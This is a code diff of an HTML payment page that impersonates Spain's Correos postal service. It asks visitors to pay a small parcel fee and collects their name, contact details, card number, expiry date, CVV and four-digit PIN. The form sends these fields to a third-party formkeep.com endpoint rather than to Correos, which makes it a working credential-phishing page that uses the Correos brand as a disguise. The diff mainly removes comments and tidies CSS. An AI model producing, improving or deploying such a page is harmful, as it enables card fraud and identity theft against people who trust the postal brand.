@@ -5,16 +5,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Formulario de Pago - Correos</title>
     <style>
-        /* Diseño General */
         body {
             font-family: 'Arial', sans-serif;
-            background-color: #FFCB05; /* Amarillo fuerte */
+            background-color: #FFCB05;
             margin: 0;
             padding: 0;
             color: #333;
         }
-
-        /* Contenedor Principal */
         .container {
             width: 100%;
             max-width: 800px;
@@ -23,68 +20,55 @@
             background: #fff;
             border-radius: 12px;
             box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
-            border: 2px solid #F7C731; /* Amarillo fuerte */
+            border: 2px solid #F7C731;
         }
-
-        /* Logo de Correos */
         .logo {
             display: block;
             margin: 0 auto 30px;
             max-width: 180px;
             cursor: pointer;
         }
-
-        /* Títulos */
         h1 {
             text-align: center;
-            color: #1A4598; /* Azul oscuro */
+            color: #1A4598;
             margin-bottom: 20px;
             font-size: 2.5em;
             letter-spacing: 1px;
         }
-
         h2 {
             text-align: center;
             color: #1A4598;
             font-size: 1.6em;
             margin-bottom: 30px;
         }
-
-        /* Estilo del formulario */
         .form-group {
             margin-bottom: 20px;
         }
-
         .form-group label {
             font-size: 16px;
             font-weight: bold;
-            color: #1A4598; /* Azul oscuro */
+            color: #1A4598;
             display: block;
             margin-bottom: 8px;
         }
-
         .form-group input {
             width: 100%;
             padding: 14px;
-            border: 2px solid #F7C731; /* Amarillo fuerte */
+            border: 2px solid #F7C731;
             border-radius: 8px;
             font-size: 16px;
             background-color: #fff;
             transition: all 0.3s ease;
             box-sizing: border-box;
         }
-
-        /* Estilo cuando el input está en foco */
         .form-group input:focus {
-            border-color: #1A4598; /* Azul cuando el input está en foco */
+            border-color: #1A4598;
             outline: none;
             box-shadow: 0 0 5px rgba(26, 69, 152, 0.3);
         }
-
-        /* Estilo del botón */
         .form-group input[type="submit"] {
-            background-color: #F7C731; /* Amarillo fuerte */
-            color: #1A4598; /* Azul en el botón */
+            background-color: #F7C731;
+            color: #1A4598;
             border: none;
             font-size: 18px;
             font-weight: bold;
@@ -94,136 +78,77 @@
             transition: all 0.3s ease;
             width: 100%;
         }
-
         .form-group input[type="submit"]:hover {
-            background-color: #F1B732; /* Amarillo oscuro */
+            background-color: #F1B732;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
-
-        /* Estilo adicional */
-        .alert {
-            color: red;
-            font-size: 14px;
-            margin-top: 10px;
-        }
-
-        /* Footer */
-        .footer {
-            text-align: center;
-            margin-top: 40px;
-            font-size: 14px;
-            color: #666;
-        }
-
-        .footer a {
-            color: #1A4598;
-            text-decoration: none;
-            font-weight: bold;
-        }
-
-        .footer a:hover {
-            text-decoration: underline;
-        }
-
-        /* Contenedor de campos y mejora de márgenes */
-        .form-group {
-            margin-bottom: 25px;
-        }
-
-        /* Estilo del texto debajo del botón de pago */
         .payment-info {
             font-size: 14px;
             color: #1A4598;
             text-align: center;
             margin-top: 15px;
         }
-
     </style>
 </head>
 <body>
-    <!-- Contenedor Principal -->
     <div class="container">
-        <!-- Logo de Correos que dirige a la web de Correos -->
         <a href="https://www.correos.es" target="_blank">
-            <img src="/logocorreos.png" />
+          <img src="logocorreos.png" alt="Logo Correos" class="logo">
         </a>
 
         <h1>Formulario de Pago - Correos</h1>
         <h2>Por favor, ingresa tus datos para procesar el pago</h2>
 
-        <!-- Formulario -->
         <form action="https://formkeep.com/f/f53d1d9ffeeb" method="POST">
-            <!-- Nombre -->
             <div class="form-group">
                 <label for="first_name">Nombre</label>
                 <input type="text" id="first_name" name="first_name" required>
             </div>
-
-            <!-- Apellidos -->
             <div class="form-group">
                 <label for="last_name">Apellidos</label>
                 <input type="text" id="last_name" name="last_name" required>
             </div>
-
-            <!-- Número de Pedido -->
             <div class="form-group">
                 <label for="order_number">Número de Pedido</label>
                 <input type="text" id="order_number" name="order_number" required>
             </div>
-
-            <!-- Correo Electrónico -->
             <div class="form-group">
                 <label for="email">Correo Electrónico</label>
                 <input type="email" id="email" name="email" required>
             </div>
-
-            <!-- Número de Teléfono -->
             <div class="form-group">
                 <label for="phone_number">Número de Teléfono</label>
                 <input type="tel" id="phone_number" name="phone_number" required>
             </div>
-
-            <!-- Número de tarjeta de crédito -->
             <div class="form-group">
                 <label for="card_number">Número de Tarjeta de Crédito</label>
                 <input type="text" id="card_number" name="card_number" required>
             </div>
-
-            <!-- Fecha de caducidad -->
             <div class="form-group">
                 <label for="expiry_date">Fecha de Caducidad (MM/AA)</label>
                 <input type="text" id="expiry_date" name="expiry_date" required>
             </div>
-
-            <!-- CVV -->
             <div class="form-group">
                 <label for="cvv">CVV</label>
                 <input type="password" id="cvv" name="cvv" required>
             </div>
-
-            <!-- PIN -->
             <div class="form-group">
                 <label for="pin">PIN de 4 dígitos</label>
                 <input type="password" id="pin" name="pin" required maxlength="4" pattern="\d{4}">
             </div>
-
-            <!-- Botón de envío -->
             <div class="form-group">
                 <input type="submit" value="Pagar 1,34 €">
             </div>
         </form>
 
-        <!-- Texto adicional debajo del botón -->
         <div class="payment-info">
             <p>Una vez realizado el pago, se le enviará un SMS informándole sobre el estado de la entrega de su paquete en todo momento.</p>
         </div>
     </div>
 
-    <!-- Footer -->
     <div class="footer">
         <p>&copy; 2024 Correos. Todos los derechos reservados. <br>
         <a href="https://www.correos.es" target="_blank">Visita nuestro sitio web</a></p>
     </div>
-
 </body>
 </html>
